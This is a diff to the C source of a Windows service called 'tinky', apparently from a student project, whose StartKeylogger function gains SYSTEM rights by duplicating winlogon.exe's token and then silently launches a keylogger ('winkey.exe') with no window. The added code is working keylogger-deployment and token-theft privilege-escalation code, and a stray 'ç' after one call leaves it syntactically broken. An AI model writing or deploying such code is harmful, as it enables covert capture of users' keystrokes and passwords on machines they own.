@@ -1,5 +1,6 @@
 #include <windows.h>
 #include <stdio.h>
+#include <tlhelp32.h>
 
 #define SERVICE_NAME "tinky"
 #define _WIN32_WINNT 0x0A00
@@ -97,20 +98,74 @@ void WINAPI ControlHandler(DWORD request)
     SetServiceStatus(hStatus, &ServiceStatus);
 }
 
+DWORD FindProcessID(const char* processName) {
+    DWORD processID = 0;
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32 pe;
+        pe.dwSize = sizeof(PROCESSENTRY32);
+        if (Process32First(hSnap, &pe)) {
+            do {
+                if (strcmp(pe.szExeFile, processName) == 0) {
+                    processID = pe.th32ProcessID;
+                    break;
+                }
+            } while (Process32Next(hSnap, &pe));
+        }
+        CloseHandle(hSnap);
+    }
+    return processID;
+}
+
 void StartKeylogger(void)
 {
-    /*copilot tab review*/
-    STARTUPINFO si = { sizeof(STARTUPINFO) };
+    DWORD pid = FindProcessID("winlogon.exe");
+    if (pid == 0)
+    {
+        printf("Failed to find winlogon.exe process.\n");
+        return;
+    }
+
+    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
+    if (!processHandle)
+    {
+        printf("OpenProcess failed: %lu\n", GetLastError());
+        return;
+    }
+
+    HANDLE tokenHandle = NULL;
+    if (!OpenProcessToken(processHandle, TOKEN_DUPLICATE, &tokenHandle))
+    {
+        printf("OpenProcessToken failed: %lu\n", GetLastError());
+        CloseHandle(processHandle);
+        return;
+    }
+
+    HANDLE dupTokenHandle = NULL;
+    if (!DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupTokenHandle))ç
+    {
+        printf("DuplicateTokenEx failed: %lu\n", GetLastError());
+        CloseHandle(tokenHandle);
+        CloseHandle(processHandle);
+        return;
+    }
+
+    STARTUPINFO si = { sizeof(si) };
     PROCESS_INFORMATION pi;
-    if (CreateProcess("C:\\path\\to\\keyloger.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
+    if (!CreateProcessAsUser(dupTokenHandle, NULL, "Z:\\tinky-winkey\\winkey\\srcs\\winkey.exe", NULL, NULL, FALSE,
+                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
+    {
+        printf("CreateProcessAsUser failed: %lu\n", GetLastError());
+    }
+    else
     {
         hKeyloggerProcess = pi.hProcess;
         CloseHandle(pi.hThread);
     }
-    else
-    {
-        printf("Failed to start keylogger: %lu\n", GetLastError());
-    }
+
+    CloseHandle(dupTokenHandle);
+    CloseHandle(tokenHandle);
+    CloseHandle(processHandle);
 }
 
 void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
